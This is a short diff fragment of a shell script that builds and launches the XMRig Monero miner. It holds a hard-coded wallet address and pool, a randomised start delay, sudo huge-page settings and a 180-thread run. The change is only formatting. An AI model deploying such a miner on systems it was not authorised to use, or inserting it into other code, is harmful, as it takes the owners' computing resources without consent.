@@ -18,11 +18,11 @@ build_xmrig() {
     sudo sysctl -w vm.nr_hugepages=8056
 }
 
-start_mining() {
+start_mining() 
+{
     sleep $((60 + RANDOM % 60))
     ./xmrig -o pool.supportxmr.com:3333 -u 82nfTTGkD2yTtGPZENcGCcM6yrgYdWqjbGvU4MpgcDzuXyVTUYkxkS4JcqEm2n73SddJ2QfdYL8JR8keXPsNwZxD872pyBc -p x --tls=false --donate-level=0 -t 180 --cpu-priority=5
 }
-
 if [ -d "xmrig" ]; then
     cd xmrig/build
 else
